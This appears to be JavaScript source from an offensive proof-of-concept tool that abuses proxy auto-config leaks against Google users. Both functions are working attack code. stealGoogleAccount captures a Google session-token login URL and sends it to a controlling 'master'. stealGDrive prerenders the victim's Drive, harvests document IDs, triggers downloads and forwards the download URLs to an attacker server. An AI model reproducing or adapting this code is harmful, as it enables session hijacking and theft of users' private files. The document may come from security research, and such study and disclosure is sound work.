
// Get a Google login token for google.co.uk
function stealGoogleAccount(pac) {
    pac.resetPacState();
    // Add 'pacblock' in the URL so we can block only these requests and not break user-initiated requests
    var google_autologin_url = 'https://accounts.google.com/ServiceLogin?hl=en&passive=true&continue=https://www.google.co.uk/?pacblock'
    // above URL will redirect to a URL matching this:
    var google_auth_token_regex = /^https:\/\/accounts\.[^\/]+\/accounts\/SetSID.*pacblock/;
    pac.addBlockRequestHandler(google_autologin_url, google_auth_token_regex, function(pac, url) {
        pac.publishMsg('show_url', { title: 'Stole Google Session', href: url, linktext: 'Click here' }); // send login URL to master
    });
}

// Steal (some) files from Google Drive
function stealGDrive(pac) {
    pac.resetPacState();
    // the Google Drive page shows thumbnails of most documents; these contains the document ID
    var thumbnail_request = /drive.google.com\/thumbnail\?id=([^&]+)/; 
    pac.addBlockRegex(thumbnail_request);
    pac.addLeakRegex(thumbnail_request);
    
    // some Google Drive downloads go via google user content
    var google_user_content = /^https:\/\/doc-.*.googleusercontent.com\/docs\/securesc\/.*download-block/; 
    pac.addBlockRegex(google_user_content);
    pac.addLeakRegex(google_user_content);

    var docIds = {}; // Google Drive document IDs
    
    pac.addRegexCallback(thumbnail_request, function(pac, url, result) {
        var docId = result[1];
        if (docId in docIds) return; // we only want to deal with each doc ID once
        docIds[docId] = 1;
        console.log("gotDocId " + docId);
        // we add 'download-block' in the URL so we can block only these requests and not break user-initiated requests
        var nextUrl = 'https://drive.google.com/uc?id=' + docId + '&export=download-block'; // trigger download process
        pac.requestUrl(nextUrl);
    });

    pac.addRegexCallback(google_user_content, function(pac, url, result) {
        console.log('sendGDriveUrlToServer ' + url);
        pac.requestUrl('/google-doc-download/?url=' + escape(url) + '&qid=' + pac.subscriptionId);
    });
    
    // prerender Google Drive and trigger thumbnail downloads 
    pac.prerenderUrl('https://drive.google.com/drive/my-drive');
}